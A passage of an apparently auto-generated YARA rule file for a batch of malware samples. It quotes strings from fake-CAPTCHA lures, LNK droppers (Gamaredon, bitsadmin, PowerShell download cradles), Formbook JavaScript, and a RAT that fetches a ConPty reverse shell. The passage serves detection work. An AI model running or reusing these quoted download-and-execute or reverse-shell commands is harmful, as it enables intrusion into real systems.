      $s10 = "    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;700&display=swap\" r" ascii /* score: '12.00'*/
      $s11 = "    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>" fullword ascii /* score: '12.00'*/
      $s12 = " \"I am not a robot - reCAPTCHA ID: ${verification_id} - Mandatory reCaptcha System 2025\"`;" fullword ascii /* score: '11.00'*/
      $s13 = " \"I am not a robot - reCAPTCHA ID: <span id=\"verification-id\"></span>\"</code>" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b_e224a1db {
   meta:
      description = "_subset_batch - file e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b_e224a1db.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b"
   strings:
      $x1 = "wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash" fullword ascii /* score: '38.00'*/
      $s2 = "wget --no-check-certificate --user-agent=\"209\" -O ~/.linvidia https://nvidiasdk.fly.dev/nvs" fullword ascii /* score: '23.00'*/
      $s3 = "\\. \"$HOME/.nvm/nvm.sh\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule e243110a2eeb52af8b2c25998c7df08cafe508a8938532f1e7c3836f81391827_e243110a {
   meta:
      description = "_subset_batch - file e243110a2eeb52af8b2c25998c7df08cafe508a8938532f1e7c3836f81391827_e243110a.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e243110a2eeb52af8b2c25998c7df08cafe508a8938532f1e7c3836f81391827"
   strings:
      $s1 = "QYrHh.agU" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule e27910e07113b413116ed9d764e2b24dfd4d209113b3fe8b45d593cf1e2afc71_e27910e0 {
   meta:
      description = "_subset_batch - file e27910e07113b413116ed9d764e2b24dfd4d209113b3fe8b45d593cf1e2afc71_e27910e0.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e27910e07113b413116ed9d764e2b24dfd4d209113b3fe8b45d593cf1e2afc71"
   strings:
      $s1 = "Proposal_Posting_of_Offrs_to_RMC_Mumbai.pdf.desktop" fullword ascii /* score: '12.00'*/
      $s2 = "Proposal_Posting_of_Offrs_to_RMC_Mumbai.pdf.desktopPK" fullword ascii /* score: '12.00'*/
      $s3 = "\\H:\\=[{" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule Formbook_signature__2 {
   meta:
      description = "_subset_batch - file Formbook(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "80d5c34b6d3d34aa0083619c339fecbfede6e2f46d5c43959f6fd92f3955649b"
   strings:
      $s1 = "        var bindlestiffs = supercaffeine.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '20.00'*/
      $s2 = "        return afterbirth.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s3 = "        return supercaffeine.Get(\"Win32_Process\");" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + enterorrhaphy + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__869cab33 {
   meta:
      description = "_subset_batch - file Formbook(signature)_869cab33.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "869cab33ed930a8eb14c56307ec7b89d377d8863d793a8d9da8e46f4b9701f9b"
   strings:
      $s1 = "        var hyaluronan = progenitors.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return progenitors.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return mascons.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + chargeable + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__8838f039 {
   meta:
      description = "_subset_batch - file Formbook(signature)_8838f039.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8838f0398e98f6d6c81da84832934be1069c037dc3fb530059a8939ba688156d"
   strings:
      $s1 = "        return sazhen.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s2 = "        var capellmeister = sazhen.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '17.00'*/
      $s3 = "        return palmation.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + erythrostomum + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__9b05f622 {
   meta:
      description = "_subset_batch - file Formbook(signature)_9b05f622.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9b05f622e4ba7da885ae2136e27311578cc291aff5980165e5b609ca7b3d0909"
   strings:
      $s1 = "        var sinistrous = microsurgery.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return microsurgery.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return chiolite.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + collemei + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__a2ff2ef2 {
   meta:
      description = "_subset_batch - file Formbook(signature)_a2ff2ef2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a2ff2ef2cbd2ee2d58f377200c292580fe500bb3607545ff27178bfff2080a16"
   strings:
      $s1 = "        var nonrelationship = epentheses.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return epentheses.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return pouteria.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + sublating + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__bd389f7d {
   meta:
      description = "_subset_batch - file Formbook(signature)_bd389f7d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd389f7d2df7b36d377f7bd4ae3b8b903f2f508dee1390224004875aa1156952"
   strings:
      $s1 = "        var washiness = glutinously.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return glutinously.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return depone.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + machinelike + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule Formbook_signature__e7806651 {
   meta:
      description = "_subset_batch - file Formbook(signature)_e7806651.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7806651cc6370046d057fc9d4441b3a956308ee0dc7962a2ea874e157b698f1"
   strings:
      $s1 = "        var diploplacular = stereoregular.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s2 = "        return stereoregular.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s3 = "        return pentagrammatic.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
      $s4 = "g(\\'' + mammothrept + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      all of them
}

rule e37fb46cb0ac209166882f55f5f06be338c3dcde474e4ee4f98c9ae427d887cf_e37fb46c {
   meta:
      description = "_subset_batch - file e37fb46cb0ac209166882f55f5f06be338c3dcde474e4ee4f98c9ae427d887cf_e37fb46c.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e37fb46cb0ac209166882f55f5f06be338c3dcde474e4ee4f98c9ae427d887cf"
   strings:
      $s1 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s2 = "-window min [Uri]::UnescapeDataString(('6375726c2e657865202768747470733a2f2f676f6f676c652e636f6d2f612e65786527207c20694578' -rep" wide /* score: '16.00'*/
      $s3 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s4 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule ea4698da522abcb0db3164ffb613ae9cfe117650cd53906a095be3536c4cab0c_ea4698da {
   meta:
      description = "_subset_batch - file ea4698da522abcb0db3164ffb613ae9cfe117650cd53906a095be3536c4cab0c_ea4698da.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea4698da522abcb0db3164ffb613ae9cfe117650cd53906a095be3536c4cab0c"
   strings:
      $x1 = "C:\\Windows\\System32\\wscript.exe" fullword ascii /* score: '32.00'*/
      $s2 = "Browse the web(..\\..\\..\\..\\Windows\\System32\\wscript.exe1C:\\Program Files (x86)\\Microsoft\\Edge\\ApplicationR//B \\\\pi-h" wide /* score: '26.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 4KB and
      1 of ($x*) and all of them
}

rule Gamaredon_signature_ {
   meta:
      description = "_subset_batch - file Gamaredon(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "83141b865be20f01dbb8520577500f57ec26357153ee093c5ba46f787aab7f7c"
   strings:
      $x1 = "-win 1 iwr -uri ht''t''p:''//5''.''8.1''8.46/sprdvth/tailor.ps1 -OutFile tailor.ps1; powershell.exe -noprofile -executionpolicy " wide /* score: '42.00'*/
      $s2 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule ee6b77c43c6ac49cffe8acbb593dd1adc0c52f735a25f1d63842d44f2712b8d5_ee6b77c4 {
   meta:
      description = "_subset_batch - file ee6b77c43c6ac49cffe8acbb593dd1adc0c52f735a25f1d63842d44f2712b8d5_ee6b77c4.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee6b77c43c6ac49cffe8acbb593dd1adc0c52f735a25f1d63842d44f2712b8d5"
   strings:
      $x1 = "/c \"bitsadmin /transfer myDownloadJob /download /priority foreground https://files.catbox.moe/ycjag7.bin %TEMP%\\RankupServiceF" wide /* score: '57.00'*/
      $x2 = "C:\\Windows\\system32\\cmd.exe" fullword wide /* score: '38.00'*/
      $s3 = "*..\\..\\..\\..\\..\\..\\Windows\\system32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "system32 (C:\\Windows)" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 5KB and
      1 of ($x*) and all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__99a49c87 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_99a49c87.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "99a49c875c8bb7dfbbb33747ee4e48aa8b3e3b507566a38a33656d9a0b637267"
   strings:
      $x1 = "C:\\Users\\Adria\\Downloads\\rat\\THISISRAT\\THISISRAT\\obj\\Debug\\THISISRAT.pdb" fullword ascii /* score: '44.00'*/
      $x2 = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPty" wide /* score: '39.00'*/
      $x3 = "-NoProfile -ExecutionPolicy Bypass -Command \"" fullword wide /* score: '39.00'*/
      $s4 = "THISISRAT.exe" fullword wide /* score: '27.00'*/
      $s5 = "THISISRAT" fullword wide /* score: '11.50'*/
      $s6 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s7 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and all of them
}

rule e46060d07eaee8222c4010316deadc47cc492d12ae0569b505f63ca898538679_e46060d0 {
   meta:
      description = "_subset_batch - file e46060d07eaee8222c4010316deadc47cc492d12ae0569b505f63ca898538679_e46060d0.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e46060d07eaee8222c4010316deadc47cc492d12ae0569b505f63ca898538679"
   strings:
      $x1 = "<DevilTable x=\"4hua,W[N0BRbpdpW,6ppcWP{$Z*j=7W;sQiZDv/yb98EOZ$2Y6HzPj_3n3vrMP[$uZANc)b82REA#-nKJ_i,UGd3_XH90amBR?51c4949Tu)7WPI" ascii /* score: '49.50'*/
      $s2 = "    <DevilEntry x=\"UKq=t7)qrlAuvHwfQ?5Ii7aPmTv1DRVOS_?J};*Hcvo.?O?KOuZ%0Q{U}D%:ZcJa2X?q*Di(2%5ZgYM{plc#%jK]KCKp1m9A3kkYSYm+bU{8" ascii /* score: '28.50'*/
      $s3 = "u=ya8gAiY(BU,VnbF(X)e]ARD4r$Z(GM%ct%otI(E?WD=(@uO.0#SRzyx{YIRCvIa4{MX,%LoS6+m*DOpQYQchDQV[Y(yCSO-2O=X.PTT=kSV/_@UFE})8JWNJnTP#mj" ascii /* score: '16.00'*/
      $s4 = "LQPaNNk}FTMnzI}WPDLlQA^.HZDmp]azj@5cRo2[NHAJeUrkY9MQmkNDPlEQM:fGPS_vg@K{kkMQg(o}QBp!oHZgEbN,xtzGetgbW/pnBP)W5oHZ}/bPfbuVb4N.AMmI" ascii /* score: '14.00'*/
      $s5 = "_HXLpw7xPIPE[b3.-uN@M;%GeJ.hZ%RvTL@@pfdu2veZ#+h%GkG#FK^/SPHe*.^K1p0yG*QW9Em3_nMrbU0Zfsb4MPOMlRDM{.LN_6%I7ew%X*aYuYcNi4I8h{jZ!S:9" ascii /* score: '13.00'*/
      $s6 = "?2ykc%p:[FqQc8htg-m3oNP?ddud^TMGl-#1!iJ%#QMj%tt-.daA*)M4m+KM14uO_F.Mwh[MbDyBugkI5S/KEy^i?}HfvDMb;8-s7rQ,ZFrv}f*#_O.n%;2}:/@b8(80" ascii /* score: '12.50'*/
      $s7 = "iIQ$s^JFH:HMGa[R#OKEyeO*+P+Q*FUzb7VFmYFb!9Uqnq{d]53fNhEY{X-PR_H)E/JD[m_udTS^^SV1mzN/w*ldM^W(Gc7qyet0w[SV3DVGh-xDT1qr/Fm@OYEJ!6^N" ascii /* score: '12.00'*/
      $s8 = "NJ%7QTtahmS9C.LNkwTqE=P)[Z([$ZEOSS3QEF@%bYmiIQ%71bD=veHB20QZSV41OOJgxfer.EDL_REjX+?1kNGWewXh$q[N@))ZY.JU8B5hMgS{-dlC0I^oX*.=zQ!P" ascii /* score: '12.00'*/
      $s9 = "E}9YFV;8R=vO_OHVL--v(iaEPzqf1rKTKPuOw/y+%@WgRZUJFtPjhqA7lRr^-dz3WO^Y-Ilr.zSut.iEl,#*8.W*Z1nrN3Z[+@lzBBAxHBCbj.%P$3LZYcRNK^ouJ84*" ascii /* score: '12.00'*/
      $s10 = "JE;/^5E.u)*MsQd;L1Qv!UMx@bLpDlLLuN?=MNUL/Y,7S5R$f$hNN]n8Y/?gbRW*ihG*8haBwtxRF/+96d0sUyNk(Cdc4T{{QE@BvaaJ#4DoA.DNn(/0XGkzwRbNeWH+" ascii /* score: '12.00'*/
      $s11 = "xAkF;,5pTP.UeM;^-BS71nTYFTP}EN*X/G$LnCbWvI/MN)5uTTfhdbADraL^U3UbwWc%N=0;,X.+S3V[Z*?Gh^kgJZUU;WHKgcTv$m)H6(zNZ7gt4Pe?vMRd.qkJVRet" ascii /* score: '12.00'*/
      $s12 = "wbVzblR(^7QS!^kyW;7@hb$(!KUw2MSdLlYrSZ]NlP,}Z1H%=AoWJ@^;ay}+hTP80(F-_?:a#}15CV3:DWOyz@N/u.^SyL%ESw;Y.OJY==CPRKhQA12xV[9ckbzfvsUt" ascii /* score: '12.00'*/
      $s13 = "IW#nJH,X)YTRv85NhC0LY+^;2MLS1CY(J1lEJ1fnTX.T2N:PYJO:)Fvcw%x:Mo2SwWH(WrOkzWBN/l}_MLK9nId4#HOEqF8U_3H*WMDLLH,X)YTRv85NjghBaAh*Sd@t" ascii /* score: '11.50'*/
      $s14 = "lMXc3VPEWGZ7ido[79Z!}vNLUlGVJWf$uC3agvPh:]%I)s#FG.cI[Q9@Y#F;OM4He*JGQg(EzNJM5,Bu-5tPA?]rHZg5Nbv7_:OL#AQIap9hX+y#fc05f=P%l1MS93RN" ascii /* score: '11.00'*/
      $s15 = "SXRYX]%I%Q2lczaVKWO5{*Nk:R#W:lvVLU2k#b_xZTM:UpdL]Nz^QbR(@DN.j6EG:eBNF[pWN/wxfB3=%.FfKwzDn=I2LUty3Tt[P}E/#5tMo(UQb_!gTM:dHkR7WaCP" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule f1773b399bbcfb8656c9ae9dd8f7a79c281ab04c4127e8cb8376400f45dd22be_f1773b39 {
   meta:
      description = "_subset_batch - file f1773b399bbcfb8656c9ae9dd8f7a79c281ab04c4127e8cb8376400f45dd22be_f1773b39.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1773b399bbcfb8656c9ae9dd8f7a79c281ab04c4127e8cb8376400f45dd22be"
   strings:
      $s1 = "x264 - core 164 r3144 5a9dfdd - H.264/MPEG-4 AVC codec - Copyleft 2003-2023 - http://www.videolan.org/x264.html - options: cabac" ascii /* score: '30.00'*/
      $s2 = "http://scripts.sil.org/OFLThis Font Software is licensed under the SIL Open Font License, Version 1.1. This license is available" wide /* score: '25.00'*/
      $s3 = "http://scripts.sil.org/OFLThis Font Software is licensed under the SIL Open Font License, Version 1.1. This license is available" wide /* score: '25.00'*/
      $s4 = "PDFSkillsApp.exe" fullword wide /* score: '22.00'*/
      $s5 = "PDFSkills.exe" fullword wide /* score: '22.00'*/
      $s6 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xnpmeta xmlns:x=\"adobe:ns:meta/\" x:xnptk=\"Adobe xnp Core 5.6-c145 79.163499, 2018/08/" ascii /* score: '22.00'*/
      $s7 = "$action = new-ScheduledTaskAction -Execute $fullPath" fullword ascii /* score: '22.00'*/
      $s8 = "PDFSkills.Belongings.Uninstall.exe" fullword ascii /* score: '22.00'*/
      $s9 = "PDFSkills.Belongings.PDFSkillsApp.exe" fullword ascii /* score: '22.00'*/
      $s10 = "Black ItalicBlackExtraBold ItalicExtraBoldBold ItalicSemiBold ItalicSemiBoldMedium ItalicMediumItalicRegularLight ItalicLightExt" wide /* score: '22.00'*/
      $s11 = "Black ItalicBlackExtraBold ItalicExtraBoldBold ItalicBoldSemiBold ItalicSemiBoldMedium ItalicMediumItalicLight ItalicLightExtraL" wide /* score: '22.00'*/
      $s12 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xnpmeta xmlns:x=\"adobe:ns:meta/\" x:xnptk=\"Adobe xnp Core 5.6-c145 79.163499, 2018/08/" ascii /* score: '21.00'*/
      $s13 = "CPDFSkillsApp, Version=4.0.0.1, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s14 = "@PDFSkills, Version=4.0.0.1, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s15 = "targetAppDataFileFullPath" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      8 of them
}

rule e48027c8487311e11111bda584940345222159f6be377b76217421d792ab7c1c_e48027c8 {
   meta:
      description = "_subset_batch - file e48027c8487311e11111bda584940345222159f6be377b76217421d792ab7c1c_e48027c8.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e48027c8487311e11111bda584940345222159f6be377b76217421d792ab7c1c"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s4 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:df0dd74e-0bb2-044b-b135-e10b0906be4c\" stEvt:when=\"2019-04-09T10:50:24+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:24+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s8 = "srlckpn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule e7f61b1c99c624ffbecc91e39ef8f6412fabb585542af9a5701cc2332a44e2c8_e7f61b1c {
   meta:
      description = "_subset_batch - file e7f61b1c99c624ffbecc91e39ef8f6412fabb585542af9a5701cc2332a44e2c8_e7f61b1c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7f61b1c99c624ffbecc91e39ef8f6412fabb585542af9a5701cc2332a44e2c8"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = ".iid:a559175d-75d2-f942-9c1d-109c0a4a1b7e\" stEvt:when=\"2019-12-04T16:27:46+02:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (W" ascii /* score: '12.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "Mqmy:\\" fullword ascii /* score: '10.00'*/
      $s7 = ">X+ -P" fullword ascii /* score: '9.00'*/
      $s8 = "* DeyI" fullword ascii /* score: '9.00'*/
      $s9 = "lDlLlHU" fullword ascii /* score: '9.00'*/
      $s10 = "03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"saved\" stEvt:instance" ascii /* score: '9.00'*/
      $s11 = "vmtrfec" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 8000KB and
      8 of them
}

rule e85502fdad48679071923d9183b8e3859e27efa92a794c0c11562b4aa481ac9b_e85502fd {
   meta:
      description = "_subset_batch - file e85502fdad48679071923d9183b8e3859e27efa92a794c0c11562b4aa481ac9b_e85502fd.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e85502fdad48679071923d9183b8e3859e27efa92a794c0c11562b4aa481ac9b"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s4 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:d030f7d4-1312-b645-acd2-d6b932bd5e46\" stEvt:when=\"2019-04-09T10:50:29+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:29+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s8 = "Na0)%I%" fullword ascii /* score: '8.00'*/
      $s9 = "JRI%)%I%)" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule ea143f72019de52426b2cd06632ba67b5d3a3d017720794fd377b7b0ada9c4a7_ea143f72 {
   meta:
      description = "_subset_batch - file ea143f72019de52426b2cd06632ba67b5d3a3d017720794fd377b7b0ada9c4a7_ea143f72.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea143f72019de52426b2cd06632ba67b5d3a3d017720794fd377b7b0ada9c4a7"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s4 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:c0241ba3-df89-5f4a-a4f3-dffa88903701\" stEvt:when=\"2019-04-09T10:50:33+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:33+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s8 = "J\\A<%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 600KB and
      all of them
}

rule f139f1a7030265bed6717528b25b127738992605644f8360ef1b63d1fc670957_f139f1a7 {
   meta:
      description = "_subset_batch - file f139f1a7030265bed6717528b25b127738992605644f8360ef1b63d1fc670957_f139f1a7.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f139f1a7030265bed6717528b25b127738992605644f8360ef1b63d1fc670957"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
